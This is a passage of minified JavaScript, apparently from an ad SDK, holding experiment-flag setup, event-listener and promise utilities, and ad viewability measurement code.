        id: 44730896,
        F: 10
    });
    K({
        id: 44731465,
        F: 10
    });
    K({
        id: 44731467,
        F: 10
    });
    K({
        id: 44736292,
        F: 10
    });
    K({
        id: 44736293,
        F: 10
    });
    K({
        id: 44731964,
        F: 10,
        Ba: Yh
    });
    K({
        id: 44731965,
        F: 10,
        Ba: Yh
    });
    K({
        id: 668123728,
        F: 10,
        Ba: Yh
    });
    K({
        id: 668123729,
        F: 10,
        Ba: Yh
    });
    K({
        id: 31061774,
        F: 10
    });
    var Li = K({
        id: 31061775,
        F: 10
    });
    K({
        id: 44730612,
        F: 50
    });
    K({
        id: 44746668,
        F: 10
    });
    K({
        id: 44746669,
        F: 10
    });
    K({
        id: 44712632,
        F: 10
    });
    K({
        id: 44712633,
        F: 10
    });
    K({
        id: 44715336,
        F: 10
    });
    K({
        id: 44729309,
        F: 10
    });
    K({
        id: 44721472,
        F: 0
    });
    K({
        id: 75259410,
        F: 0
    });
    K({
        id: 75259412,
        F: 0
    });
    K({
        id: 75259413,
        F: 0
    });
    K({
        id: 44725355,
        F: 50,
        Ba: Ei
    });
    var Mi = K({
        id: 44725356,
        F: 50,
        Ba: Ei
    });
    K({
        id: 44724516,
        F: 0
    });
    K({
        id: 44726389,
        F: 10
    });
    K({
        id: 44726392,
        F: 10
    });
    K({
        id: 44726393,
        F: 10
    });
    K({
        id: 44730464,
        F: 10
    });
    K({
        id: 44730465,
        F: 10
    });
    K({
        id: 44733378,
        F: 10
    });
    K({
        id: 44727953,
        F: 0
    });
    K({
        id: 44729911,
        F: 0
    });
    K({
        id: 44730425,
        F: 0
    });
    K({
        id: 44730426,
        F: 0
    });
    K({
        id: 447304389,
        F: 0
    });
    K({
        id: 44732022,
        F: 10
    });
    K({
        id: 44732023,
        F: 10
    });
    K({
        id: 44733246,
        F: 10
    });
    K({
        id: 44736980,
        F: 0
    });
    K({
        id: 44736981,
        F: 0
    });
    K({
        id: 44736979,
        F: 0
    });
    K({
        id: 44737473,
        F: 100,
        Ba: Di
    });
    K({
        id: 44737475,
        F: 100,
        Ba: Di
    });
    K({
        id: 44738437,
        F: 0
    });
    var Ni = K({
        id: 44738438,
        F: 0
    });
    K({
        id: 44745938,
        F: 50
    });
    K({
        id: 44745939,
        F: 50
    });
    K({
        id: 44745940,
        F: 100
    });
    K({
        id: 44745941,
        F: 100
    });
    K({
        id: 44741233,
        F: 10
    });
    K({
        id: 44741234,
        F: 10
    });
    K({
        id: 44746831,
        F: 10
    });
    var Oi = K({
        id: 44746832,
        F: 10
    });
    K({
        id: 44749185,
        F: 10
    });
    var Pi = {},
        vi = (Pi[32] = Yh, Pi[35] = Fi, Pi);
    vi = void 0 === vi ? {} : vi;
    if (!/^\{+IMA_EXPERIMENT_STATE_JSPB\}+$/.test("{{IMA_EXPERIMENT_STATE_JSPB}}")) try {
        var wi = JSON.parse("{{IMA_EXPERIMENT_STATE_JSPB}}");
        wi instanceof Array && ui()
    } catch (a) {
        I(J(), "espe", a.message)
    }
    if ("undefined" === typeof window.v8_flag_map) {
        var Oh = G(Ai);
        Oh.h || (Ph(), Oh.h = !0);
        var Ci = Oh.l,
            Qi;
        Oh.h || (Ph(), Oh.h = !0);
        Qi = Oh.g;
        if (null != Ci) {
            var Ri = new zi(Bi(), Qi);
            Xh(Ri)
        }
    };
    Vh.reset();
    Xh(new $h);
    u.console && "function" === typeof u.console.log && Wa(u.console.log, u.console);
    var Si = function(a) {
        for (var b = [], c = a = E(a.ownerDocument); c != a.top; c = c.parent)
            if (c.frameElement) b.push(c.frameElement);
            else break;
        return b
    };

    function Ti(a) {
        a && "function" == typeof a.W && a.W()
    };
    var L = function() {
        this.L = this.L;
        this.I = this.I
    };
    L.prototype.L = !1;
    L.prototype.Ra = function() {
        return this.L
    };
    L.prototype.W = function() {
        this.L || (this.L = !0, this.N())
    };
    var Vi = function(a, b) {
            Ui(a, Xa(Ti, b))
        },
        Ui = function(a, b) {
            a.L ? b() : (a.I || (a.I = []), a.I.push(b))
        };
    L.prototype.N = function() {
        if (this.I)
            for (; this.I.length;) this.I.shift()()
    };
    var Wi = function(a, b) {
        this.type = a;
        this.currentTarget = this.target = b;
        this.defaultPrevented = this.h = !1
    };
    Wi.prototype.stopPropagation = function() {
        this.h = !0
    };
    Wi.prototype.preventDefault = function() {
        this.defaultPrevented = !0
    };
    var Xi = function() {
        if (!u.addEventListener || !Object.defineProperty) return !1;
        var a = !1,
            b = Object.defineProperty({}, "passive", {
                get: function() {
                    a = !0
                }
            });
        try {
            u.addEventListener("test", La, b), u.removeEventListener("test", La, b)
        } catch (c) {}
        return a
    }();
    var Yi = function(a, b) {
        Wi.call(this, a ? a.type : "");
        this.relatedTarget = this.currentTarget = this.target = null;
        this.button = this.screenY = this.screenX = this.clientY = this.clientX = 0;
        this.key = "";
        this.metaKey = this.shiftKey = this.altKey = this.ctrlKey = !1;
        this.state = null;
        this.pointerId = 0;
        this.pointerType = "";
        this.g = null;
        a && this.init(a, b)
    };
    Za(Yi, Wi);
    var Zi = {
        2: "touch",
        3: "pen",
        4: "mouse"
    };
    Yi.prototype.init = function(a, b) {
        var c = this.type = a.type,
            d = a.changedTouches && a.changedTouches.length ? a.changedTouches[0] : null;
        this.target = a.target || a.srcElement;
        this.currentTarget = b;
        (b = a.relatedTarget) ? xd && (rd(b, "nodeName") || (b = null)): "mouseover" == c ? b = a.fromElement : "mouseout" == c && (b = a.toElement);
        this.relatedTarget = b;
        d ? (this.clientX = void 0 !== d.clientX ? d.clientX : d.pageX, this.clientY = void 0 !== d.clientY ? d.clientY : d.pageY, this.screenX = d.screenX || 0, this.screenY = d.screenY || 0) : (this.clientX = void 0 !== a.clientX ?
            a.clientX : a.pageX, this.clientY = void 0 !== a.clientY ? a.clientY : a.pageY, this.screenX = a.screenX || 0, this.screenY = a.screenY || 0);
        this.button = a.button;
        this.key = a.key || "";
        this.ctrlKey = a.ctrlKey;
        this.altKey = a.altKey;
        this.shiftKey = a.shiftKey;
        this.metaKey = a.metaKey;
        this.pointerId = a.pointerId || 0;
        this.pointerType = "string" === typeof a.pointerType ? a.pointerType : Zi[a.pointerType] || "";
        this.state = a.state;
        this.g = a;
        a.defaultPrevented && Yi.xa.preventDefault.call(this)
    };
    Yi.prototype.stopPropagation = function() {
        Yi.xa.stopPropagation.call(this);
        this.g.stopPropagation ? this.g.stopPropagation() : this.g.cancelBubble = !0
    };
    Yi.prototype.preventDefault = function() {
        Yi.xa.preventDefault.call(this);
        var a = this.g;
        a.preventDefault ? a.preventDefault() : a.returnValue = !1
    };
    var $i = "closure_listenable_" + (1E6 * Math.random() | 0),
        aj = function(a) {
            return !(!a || !a[$i])
        };
    var bj = 0;
    var cj = function(a, b, c, d, e) {
            this.listener = a;
            this.g = null;
            this.src = b;
            this.type = c;
            this.capture = !!d;
            this.Wb = e;
            this.key = ++bj;
            this.Ib = this.Qb = !1
        },
        dj = function(a) {
            a.Ib = !0;
            a.listener = null;
            a.g = null;
            a.src = null;
            a.Wb = null
        };
    var ej = function(a) {
        this.src = a;
        this.g = {};
        this.h = 0
    };
    ej.prototype.add = function(a, b, c, d, e) {
        var f = a.toString();
        a = this.g[f];
        a || (a = this.g[f] = [], this.h++);
        var g = fj(a, b, d, e); - 1 < g ? (b = a[g], c || (b.Qb = !1)) : (b = new cj(b, this.src, f, !!d, e), b.Qb = c, a.push(b));
        return b
    };
    ej.prototype.remove = function(a, b, c, d) {
        a = a.toString();
        if (!(a in this.g)) return !1;
        var e = this.g[a];
        b = fj(e, b, c, d);
        return -1 < b ? (dj(e[b]), yb(e, b), 0 == e.length && (delete this.g[a], this.h--), !0) : !1
    };
    var gj = function(a, b) {
        var c = b.type;
        c in a.g && xb(a.g[c], b) && (dj(b), 0 == a.g[c].length && (delete a.g[c], a.h--))
    };
    ej.prototype.Cb = function(a, b, c, d) {
        a = this.g[a.toString()];
        var e = -1;
        a && (e = fj(a, b, c, d));
        return -1 < e ? a[e] : null
    };
    var fj = function(a, b, c, d) {
        for (var e = 0; e < a.length; ++e) {
            var f = a[e];
            if (!f.Ib && f.listener == b && f.capture == !!c && f.Wb == d) return e
        }
        return -1
    };
    var hj = "closure_lm_" + (1E6 * Math.random() | 0),
        ij = {},
        jj = 0,
        lj = function(a, b, c, d, e) {
            if (d && d.once) return kj(a, b, c, d, e);
            if (Array.isArray(b)) {
                for (var f = 0; f < b.length; f++) lj(a, b[f], c, d, e);
                return null
            }
            c = mj(c);
            return aj(a) ? a.O(b, c, Na(d) ? !!d.capture : !!d, e) : nj(a, b, c, !1, d, e)
        },
        nj = function(a, b, c, d, e, f) {
            if (!b) throw Error("Invalid event type");
            var g = Na(e) ? !!e.capture : !!e,
                h = oj(a);
            h || (a[hj] = h = new ej(a));
            c = h.add(b, c, d, g, f);
            if (c.g) return c;
            d = pj();
            c.g = d;
            d.src = a;
            d.listener = c;
            if (a.addEventListener) Xi || (e = g), void 0 === e && (e = !1),
                a.addEventListener(b.toString(), d, e);
            else if (a.attachEvent) a.attachEvent(qj(b.toString()), d);
            else if (a.addListener && a.removeListener) a.addListener(d);
            else throw Error("addEventListener and attachEvent are unavailable.");
            jj++;
            return c
        },
        pj = function() {
            var a = rj,
                b = function(c) {
                    return a.call(b.src, b.listener, c)
                };
            return b
        },
        kj = function(a, b, c, d, e) {
            if (Array.isArray(b)) {
                for (var f = 0; f < b.length; f++) kj(a, b[f], c, d, e);
                return null
            }
            c = mj(c);
            return aj(a) ? a.Gb(b, c, Na(d) ? !!d.capture : !!d, e) : nj(a, b, c, !0, d, e)
        },
        sj = function(a,
            b, c, d, e) {
            if (Array.isArray(b))
                for (var f = 0; f < b.length; f++) sj(a, b[f], c, d, e);
            else d = Na(d) ? !!d.capture : !!d, c = mj(c), aj(a) ? a.Ua(b, c, d, e) : a && (a = oj(a)) && (b = a.Cb(b, c, d, e)) && tj(b)
        },
        tj = function(a) {
            if ("number" !== typeof a && a && !a.Ib) {
                var b = a.src;
                if (aj(b)) gj(b.B, a);
                else {
                    var c = a.type,
                        d = a.g;
                    b.removeEventListener ? b.removeEventListener(c, d, a.capture) : b.detachEvent ? b.detachEvent(qj(c), d) : b.addListener && b.removeListener && b.removeListener(d);
                    jj--;
                    (c = oj(b)) ? (gj(c, a), 0 == c.h && (c.src = null, b[hj] = null)) : dj(a)
                }
            }
        },
        qj = function(a) {
            return a in
                ij ? ij[a] : ij[a] = "on" + a
        },
        rj = function(a, b) {
            if (a.Ib) a = !0;
            else {
                b = new Yi(b, this);
                var c = a.listener,
                    d = a.Wb || a.src;
                a.Qb && tj(a);
                a = c.call(d, b)
            }
            return a
        },
        oj = function(a) {
            a = a[hj];
            return a instanceof ej ? a : null
        },
        uj = "__closure_events_fn_" + (1E9 * Math.random() >>> 0),
        mj = function(a) {
            if ("function" === typeof a) return a;
            a[uj] || (a[uj] = function(b) {
                return a.handleEvent(b)
            });
            return a[uj]
        };
    var M = function() {
        L.call(this);
        this.B = new ej(this);
        this.Ob = this;
        this.sa = null
    };
    Za(M, L);
    M.prototype[$i] = !0;
    l = M.prototype;
    l.addEventListener = function(a, b, c, d) {
        lj(this, a, b, c, d)
    };
    l.removeEventListener = function(a, b, c, d) {
        sj(this, a, b, c, d)
    };
    l.dispatchEvent = function(a) {
        var b, c = this.sa;
        if (c)
            for (b = []; c; c = c.sa) b.push(c);
        c = this.Ob;
        var d = a.type || a;
        if ("string" === typeof a) a = new Wi(a, c);
        else if (a instanceof Wi) a.target = a.target || c;
        else {
            var e = a;
            a = new Wi(d, c);
            Xb(a, e)
        }
        e = !0;
        if (b)
            for (var f = b.length - 1; !a.h && 0 <= f; f--) {
                var g = a.currentTarget = b[f];
                e = vj(g, d, !0, a) && e
            }
        a.h || (g = a.currentTarget = c, e = vj(g, d, !0, a) && e, a.h || (e = vj(g, d, !1, a) && e));
        if (b)
            for (f = 0; !a.h && f < b.length; f++) g = a.currentTarget = b[f], e = vj(g, d, !1, a) && e;
        return e
    };
    l.N = function() {
        M.xa.N.call(this);
        if (this.B) {
            var a = this.B,
                b = 0,
                c;
            for (c in a.g) {
                for (var d = a.g[c], e = 0; e < d.length; e++) ++b, dj(d[e]);
                delete a.g[c];
                a.h--
            }
        }
        this.sa = null
    };
    l.O = function(a, b, c, d) {
        return this.B.add(String(a), b, !1, c, d)
    };
    l.Gb = function(a, b, c, d) {
        return this.B.add(String(a), b, !0, c, d)
    };
    l.Ua = function(a, b, c, d) {
        this.B.remove(String(a), b, c, d)
    };
    var vj = function(a, b, c, d) {
        b = a.B.g[String(b)];
        if (!b) return !0;
        b = b.concat();
        for (var e = !0, f = 0; f < b.length; ++f) {
            var g = b[f];
            if (g && !g.Ib && g.capture == c) {
                var h = g.listener,
                    k = g.Wb || g.src;
                g.Qb && gj(a.B, g);
                e = !1 !== h.call(k, d) && e
            }
        }
        return e && !d.defaultPrevented
    };
    M.prototype.Cb = function(a, b, c, d) {
        return this.B.Cb(String(a), b, c, d)
    };
    var wj = function(a, b) {
        this.l = a;
        this.o = b;
        this.h = 0;
        this.g = null
    };
    wj.prototype.get = function() {
        if (0 < this.h) {
            this.h--;
            var a = this.g;
            this.g = a.next;
            a.next = null
        } else a = this.l();
        return a
    };
    var xj = function(a, b) {
        a.o(b);
        100 > a.h && (a.h++, b.next = a.g, a.g = b)
    };
    var yj, zj = function() {
        var a = u.MessageChannel;
        "undefined" === typeof a && "undefined" !== typeof window && window.postMessage && window.addEventListener && !A("Presto") && (a = function() {
            var e = vf(document, "IFRAME");
            e.style.display = "none";
            document.documentElement.appendChild(e);
            var f = e.contentWindow;
            e = f.document;
            e.open();
            e.close();
            var g = "callImmediate" + Math.random(),
                h = "file:" == f.location.protocol ? "*" : f.location.protocol + "//" + f.location.host;
            e = Wa(function(k) {
                    if (("*" == h || k.origin == h) && k.data == g) this.port1.onmessage()
                },
                this);
            f.addEventListener("message", e, !1);
            this.port1 = {};
            this.port2 = {
                postMessage: function() {
                    f.postMessage(g, h)
                }
            }
        });
        if ("undefined" !== typeof a && !Ic()) {
            var b = new a,
                c = {},
                d = c;
            b.port1.onmessage = function() {
                if (void 0 !== c.next) {
                    c = c.next;
                    var e = c.rd;
                    c.rd = null;
                    e()
                }
            };
            return function(e) {
                d.next = {
                    rd: e
                };
                d = d.next;
                b.port2.postMessage(0)
            }
        }
        return function(e) {
            u.setTimeout(e, 0)
        }
    };

    function Aj(a) {
        u.setTimeout(function() {
            throw a;
        }, 0)
    };
    var Bj = function() {
        this.h = this.g = null
    };
    Bj.prototype.add = function(a, b) {
        var c = Cj.get();
        c.set(a, b);
        this.h ? this.h.next = c : this.g = c;
        this.h = c
    };
    Bj.prototype.remove = function() {
        var a = null;
        this.g && (a = this.g, this.g = this.g.next, this.g || (this.h = null), a.next = null);
        return a
    };
    var Cj = new wj(function() {
            return new Dj
        }, function(a) {
            return a.reset()
        }),
        Dj = function() {
            this.next = this.g = this.h = null
        };
    Dj.prototype.set = function(a, b) {
        this.h = a;
        this.g = b;
        this.next = null
    };
    Dj.prototype.reset = function() {
        this.next = this.g = this.h = null
    };
    var Ij = function(a, b) {
            Ej || Fj();
            Gj || (Ej(), Gj = !0);
            Hj.add(a, b)
        },
        Ej, Fj = function() {
            if (u.Promise && u.Promise.resolve) {
                var a = u.Promise.resolve(void 0);
                Ej = function() {
                    a.then(Jj)
                }
            } else Ej = function() {
                var b = Jj;
                "function" !== typeof u.setImmediate || u.Window && u.Window.prototype && !A("Edge") && u.Window.prototype.setImmediate == u.setImmediate ? (yj || (yj = zj()), yj(b)) : u.setImmediate(b)
            }
        },
        Gj = !1,
        Hj = new Bj,
        Jj = function() {
            for (var a; a = Hj.remove();) {
                try {
                    a.h.call(a.g)
                } catch (b) {
                    Aj(b)
                }
                xj(Cj, a)
            }
            Gj = !1
        };
    var Kj = function(a) {
        if (!a) return !1;
        try {
            return !!a.$goog_Thenable
        } catch (b) {
            return !1
        }
    };
    var Mj = function(a) {
            this.g = 0;
            this.C = void 0;
            this.o = this.h = this.l = null;
            this.B = this.A = !1;
            if (a != La) try {
                var b = this;
                a.call(void 0, function(c) {
                    Lj(b, 2, c)
                }, function(c) {
                    Lj(b, 3, c)
                })
            } catch (c) {
                Lj(this, 3, c)
            }
        },
        Nj = function() {
            this.next = this.context = this.h = this.l = this.g = null;
            this.o = !1
        };
    Nj.prototype.reset = function() {
        this.context = this.h = this.l = this.g = null;
        this.o = !1
    };
    var Oj = new wj(function() {
            return new Nj
        }, function(a) {
            a.reset()
        }),
        Pj = function(a, b, c) {
            var d = Oj.get();
            d.l = a;
            d.h = b;
            d.context = c;
            return d
        };
    Mj.prototype.then = function(a, b, c) {
        return Qj(this, "function" === typeof a ? a : null, "function" === typeof b ? b : null, c)
    };
    Mj.prototype.$goog_Thenable = !0;
    Mj.prototype.cancel = function(a) {
        if (0 == this.g) {
            var b = new Rj(a);
            Ij(function() {
                Sj(this, b)
            }, this)
        }
    };
    var Sj = function(a, b) {
            if (0 == a.g)
                if (a.l) {
                    var c = a.l;
                    if (c.h) {
                        for (var d = 0, e = null, f = null, g = c.h; g && (g.o || (d++, g.g == a && (e = g), !(e && 1 < d))); g = g.next) e || (f = g);
                        e && (0 == c.g && 1 == d ? Sj(c, b) : (f ? (d = f, d.next == c.o && (c.o = d), d.next = d.next.next) : Tj(c), Uj(c, e, 3, b)))
                    }
                    a.l = null
                } else Lj(a, 3, b)
        },
        Wj = function(a, b) {
            a.h || 2 != a.g && 3 != a.g || Vj(a);
            a.o ? a.o.next = b : a.h = b;
            a.o = b
        },
        Qj = function(a, b, c, d) {
            var e = Pj(null, null, null);
            e.g = new Mj(function(f, g) {
                e.l = b ? function(h) {
                    try {
                        var k = b.call(d, h);
                        f(k)
                    } catch (n) {
                        g(n)
                    }
                } : f;
                e.h = c ? function(h) {
                    try {
                        var k = c.call(d,
                            h);
                        void 0 === k && h instanceof Rj ? g(h) : f(k)
                    } catch (n) {
                        g(n)
                    }
                } : g
            });
            e.g.l = a;
            Wj(a, e);
            return e.g
        };
    Mj.prototype.L = function(a) {
        this.g = 0;
        Lj(this, 2, a)
    };
    Mj.prototype.D = function(a) {
        this.g = 0;
        Lj(this, 3, a)
    };
    var Lj = function(a, b, c) {
            if (0 == a.g) {
                a === c && (b = 3, c = new TypeError("Promise cannot resolve to itself"));
                a.g = 1;
                a: {
                    var d = c,
                        e = a.L,
                        f = a.D;
                    if (d instanceof Mj) {
                        Wj(d, Pj(e || La, f || null, a));
                        var g = !0
                    } else if (Kj(d)) d.then(e, f, a),
                    g = !0;
                    else {
                        if (Na(d)) try {
                            var h = d.then;
                            if ("function" === typeof h) {
                                Xj(d, h, e, f, a);
                                g = !0;
                                break a
                            }
                        } catch (k) {
                            f.call(a, k);
                            g = !0;
                            break a
                        }
                        g = !1
                    }
                }
                g || (a.C = c, a.g = b, a.l = null, Vj(a), 3 != b || c instanceof Rj || Yj(a, c))
            }
        },
        Xj = function(a, b, c, d, e) {
            var f = !1,
                g = function(k) {
                    f || (f = !0, c.call(e, k))
                },
                h = function(k) {
                    f || (f = !0, d.call(e,
                        k))
                };
            try {
                b.call(a, g, h)
            } catch (k) {
                h(k)
            }
        },
        Vj = function(a) {
            a.A || (a.A = !0, Ij(a.I, a))
        },
        Tj = function(a) {
            var b = null;
            a.h && (b = a.h, a.h = b.next, b.next = null);
            a.h || (a.o = null);
            return b
        };
    Mj.prototype.I = function() {
        for (var a; a = Tj(this);) Uj(this, a, this.g, this.C);
        this.A = !1
    };
    var Uj = function(a, b, c, d) {
            if (3 == c && b.h && !b.o)
                for (; a && a.B; a = a.l) a.B = !1;
            if (b.g) b.g.l = null, Zj(b, c, d);
            else try {
                b.o ? b.l.call(b.context) : Zj(b, c, d)
            } catch (e) {
                ak.call(null, e)
            }
            xj(Oj, b)
        },
        Zj = function(a, b, c) {
            2 == b ? a.l.call(a.context, c) : a.h && a.h.call(a.context, c)
        },
        Yj = function(a, b) {
            a.B = !0;
            Ij(function() {
                a.B && ak.call(null, b)
            })
        },
        ak = Aj,
        Rj = function(a) {
            bb.call(this, a)
        };
    Za(Rj, bb);
    Rj.prototype.name = "cancel";
    var bk = function(a, b) {
        M.call(this);
        this.h = a || 1;
        this.g = b || u;
        this.l = Wa(this.qf, this);
        this.o = Ya()
    };
    Za(bk, M);
    l = bk.prototype;
    l.jb = !1;
    l.Da = null;
    l.qf = function() {
        if (this.jb) {
            var a = Ya() - this.o;
            0 < a && a < .8 * this.h ? this.Da = this.g.setTimeout(this.l, this.h - a) : (this.Da && (this.g.clearTimeout(this.Da), this.Da = null), this.dispatchEvent("tick"), this.jb && (this.stop(), this.start()))
        }
    };
    l.start = function() {
        this.jb = !0;
        this.Da || (this.Da = this.g.setTimeout(this.l, this.h), this.o = Ya())
    };
    l.stop = function() {
        this.jb = !1;
        this.Da && (this.g.clearTimeout(this.Da), this.Da = null)
    };
    l.N = function() {
        bk.xa.N.call(this);
        this.stop();
        delete this.g
    };
    var ck = function(a, b, c) {
        if ("function" === typeof a) c && (a = Wa(a, c));
        else if (a && "function" == typeof a.handleEvent) a = Wa(a.handleEvent, a);
        else throw Error("Invalid listener argument");
        return 2147483647 < Number(b) ? -1 : u.setTimeout(a, b || 0)
    };
    var dk = function() {
        return Math.round(Date.now() / 1E3)
    };
    var ek = function() {
        this.g = {};
        return this
    };
    ek.prototype.remove = function(a) {
        var b = this.g;
        a in b && delete b[a]
    };
    ek.prototype.set = function(a, b) {
        this.g[a] = b
    };
    var fk = function(a, b) {
        a.g.eb = Vb(a.g, "eb", 0) | b
    };
    ek.prototype.get = function(a) {
        return Vb(this.g, a, null)
    };
    var gk = null,
        hk = function() {
            this.g = {};
            this.h = 0
        },
        ik = function() {
            gk || (gk = new hk);
            return gk
        },
        jk = function(a, b) {
            a.g[b.getName()] = b
        },
        kk = function(a, b) {
            this.o = a;
            this.l = !0;
            this.g = b
        };
    kk.prototype.getName = function() {
        return this.o
    };
    kk.prototype.h = function() {
        return String(this.g)
    };
    var lk = function(a, b) {
        kk.call(this, String(a), b);
        this.B = a;
        this.g = !!b
    };
    t(lk, kk);
    lk.prototype.h = function() {
        return this.g ? "1" : "0"
    };
    var mk = function(a, b) {
        kk.call(this, a, b)
    };
    t(mk, kk);
    mk.prototype.h = function() {
        return this.g ? Math.round(this.g.top) + "." + Math.round(this.g.left) + "." + (Math.round(this.g.top) + Math.round(this.g.height)) + "." + (Math.round(this.g.left) + Math.round(this.g.width)) : ""
    };
    var nk = function(a) {
        if (a.match(/^-?[0-9]+\.-?[0-9]+\.-?[0-9]+\.-?[0-9]+$/)) {
            a = a.split(".");
            var b = Number(a[0]),
                c = Number(a[1]);
            return new mk("", new Zf(c, b, Number(a[3]) - c, Number(a[2]) - b))
        }
        return new mk("", new Zf(0, 0, 0, 0))
    };
    var ok = function(a) {
            var b = new Zf(-Number.MAX_VALUE / 2, -Number.MAX_VALUE / 2, Number.MAX_VALUE, Number.MAX_VALUE),
                c = new Zf(0, 0, 0, 0);
            if (!a || 0 == a.length) return c;
            for (var d = 0; d < a.length; d++) {
                a: {
                    var e = b;
                    var f = a[d],
                        g = Math.max(e.left, f.left),
                        h = Math.min(e.left + e.width, f.left + f.width);
                    if (g <= h) {
                        var k = Math.max(e.top, f.top);
                        f = Math.min(e.top + e.height, f.top + f.height);
                        if (k <= f) {
                            e.left = g;
                            e.top = k;
                            e.width = h - g;
                            e.height = f - k;
                            e = !0;
                            break a
                        }
                    }
                    e = !1
                }
                if (!e) return c
            }
            return b
        },
        pk = function(a, b) {
            var c = a.getBoundingClientRect();
            a = ng(a,
                b);
            return new Zf(Math.round(a.x), Math.round(a.y), Math.round(c.right - c.left), Math.round(c.bottom - c.top))
        },
        qk = function(a, b, c) {
            if (b && c) {
                a: {
                    var d = Math.max(b.left, c.left);
                    var e = Math.min(b.left + b.width, c.left + c.width);
                    if (d <= e) {
                        var f = Math.max(b.top, c.top),
                            g = Math.min(b.top + b.height, c.top + c.height);
                        if (f <= g) {
                            d = new Zf(d, f, e - d, g - f);
                            break a
                        }
                    }
                    d = null
                }
                e = d ? d.height * d.width : 0;f = d ? b.height * b.width : 0;d = d && f ? Math.round(e / f * 100) : 0;jk(a, new kk("vp", d));d && 0 < d ? (e = $f(b), f = $f(c), e = e.top >= f.top && e.top < f.bottom) : e = !1;jk(a, new lk(512,
                    e));d && 0 < d ? (e = $f(b), f = $f(c), e = e.bottom <= f.bottom && e.bottom > f.top) : e = !1;jk(a, new lk(1024, e));d && 0 < d ? (e = $f(b), f = $f(c), e = e.left >= f.left && e.left < f.right) : e = !1;jk(a, new lk(2048, e));d && 0 < d ? (b = $f(b), c = $f(c), c = b.right <= c.right && b.right > c.left) : c = !1;jk(a, new lk(4096, c))
            }
        };
    var rk = function(a, b) {
        var c = 0;
        Ob(E(), "ima", "video", "client", "tagged") && (c = 1);
        var d = null;
        a && (d = a());
        if (d) {
            a = ik();
            a.g = {};
            var e = new lk(32, !0);
            e.l = !1;
            jk(a, e);
            e = E().document;
            e = e.visibilityState || e.webkitVisibilityState || e.mozVisibilityState || e.msVisibilityState || "";
            jk(a, new lk(64, "hidden" != e.toLowerCase().substring(e.length - 6) ? !0 : !1));
            try {
                var f = E().top;
                try {
                    var g = !!f.location.href || "" === f.location.href
                } catch (m) {
                    g = !1
                }
                if (g) {
                    var h = Si(d);
                    var k = h && 0 != h.length ? "1" : "0"
                } else k = "2"
            } catch (m) {
                k = "2"
            }
            jk(a, new lk(256,
                "2" == k));
            jk(a, new lk(128, "1" == k));
            h = g = E().top;
            "2" == k && (h = E());
            f = pk(d, h);
            jk(a, new mk("er", f));
            try {
                var n = h.document && !h.document.body ? null : tf(h || window)
            } catch (m) {
                n = null
            }
            n ? (h = uf( of (h.document).g), jk(a, new lk(16384, !!h)), n = h ? new Zf(h.x, h.y, n.width, n.height) : null) : n = null;
            jk(a, new mk("vi", n));
            if (n && "1" == k) {
                k = Si(d);
                d = [];
                for (h = 0; h < k.length; h++)(e = pk(k[h], g)) && d.push(e);
                d.push(n);
                n = ok(d)
            }
            qk(a, f, n);
            a.h && jk(a, new kk("ts", dk() - a.h));
            a.h = dk()
        } else a = ik(), a.g = {}, a.h = dk(), jk(a, new lk(32, !1));
        this.l = a;
        this.g = new ek;
        this.g.set("ve", 4);
        c && fk(this.g, 1);
        Ob(E(), "ima", "video", "client", "crossdomainTag") && fk(this.g, 4);
        Ob(E(), "ima", "video", "client", "sdkTag") && fk(this.g, 8);
        Ob(E(), "ima", "video", "client", "jsTag") && fk(this.g, 2);
        b && Vb(b, "fullscreen", !1) && fk(this.g, 16);
        this.h = b = null;
        if (c && (c = Ob(E(), "ima", "video", "client"), c.getEData)) {
            this.h = c.getEData();
            if (c = Ob(E(), "ima", "video", "client", "getLastSnapshotFromTop"))
                if (a = c()) this.h.extendWithDataFromTopIframe(a.tagstamp, a.playstamp, a.lactstamp), c = this.l, b = a.er, a = a.vi, b && a &&
                    (b = nk(b).g, a = nk(a).g, k = null, Vb(c.g, "er", null) && (k = Vb(c.g, "er", null).g, k.top += b.top, k.left += b.left, jk(c, new mk("er", k))), Vb(c.g, "vi", null) && (n = Vb(c.g, "vi", null).g, n.top += b.top, n.left += b.left, d = [], d.push(n), d.push(b), d.push(a), b = ok(d), qk(c, k, b), jk(c, new mk("vi", a))));
            a: {
                if (this.h) {
                    if (this.h.getTagLoadTimestamp) {
                        b = this.h.getTagLoadTimestamp();
                        break a
                    }
                    if (this.h.getTimeSinceTagLoadSeconds) {
                        b = this.h.getTimeSinceTagLoadSeconds();
                        break a
                    }
                }
                b = null
            }
        }
        c = this.g;
        a = window.performance && window.performance.timing &&
            window.performance.timing.domLoading && 0 < window.performance.timing.domLoading ? Math.round(window.performance.timing.domLoading / 1E3) : null;
        c.set.call(c, "td", dk() - (null != a ? a : null != b ? b : dk()))
    };
    var sk = new bk(200),
        tk = function(a, b) {
            try {
                var c = new rk(a, b);
                a = [];
                var d = Number(c.g.get("eb"));
                c.g.remove("eb");
                var e, f = c.g;
                b = [];
                for (var g in f.g) b.push(g + f.g[g]);
                (e = b.join("_")) && a.push(e);
                if (c.h) {
                    var h = c.h.serialize();
                    h && a.push(h)
                }
                var k, n = c.l;
                e = d;
                f = [];
                e || (e = 0);
                for (var m in n.g) {
                    var v = n.g[m];
                    if (v instanceof lk) v.g && (e |= v.B);
                    else {
                        var r, w = n.g[m];
                        (r = w.l ? w.h() : "") && f.push(m + r)
                    }
                }
                f.push("eb" + String(e));
                (k = f.join("_")) && a.push(k);
                c.g.set("eb", d);
                return a.join("_")
            } catch (x) {
                return "tle;" + Xc(x.name, 12) + ";" + Xc(x.message,
                    40)
            }
        },
        uk = function(a, b) {
            lj(sk, "tick", function() {
                var c = tk(b);
                a(c)
            });
            sk.start();
            sk.dispatchEvent("tick")
        };
    var wk = function(a) {
        B.call(this, a, -1, vk)
    };
    t(wk, B);
    var xk = function(a) {
        B.call(this, a)
    };
    t(xk, B);
    var zk = function(a, b) {
            ke(b, 1, C(a, 1));
            ne(b, 2, Ie(a, yk, 2));
            ne(b, 3, Ie(a, yk, 3));
            var c = C(a, 4);
            null != c && le(b, 4, fb(c));
            c = C(a, 5);
            null != c && le(b, 5, fb(c));
            Pe(a, b)
        },
        yk = function(a) {
            B.call(this, a)
        };
    t(yk, B);
    var me = function(a, b) {
            ke(b, 1, C(a, 1));
            ke(b, 2, C(a, 2));
            ke(b, 3, C(a, 3));
            Pe(a, b)
        },
        Ak = function(a) {
            B.call(this, a)
        };
    t(Ak, B);
    var Bk = function(a, b) {
            return Ee(a, 8, b)
        },
        Ck = function(a, b) {
            var c = C(a, 1);
            null != c && le(b, 1, fb(c));
            c = C(a, 2);
            null != c && le(b, 2, fb(c));
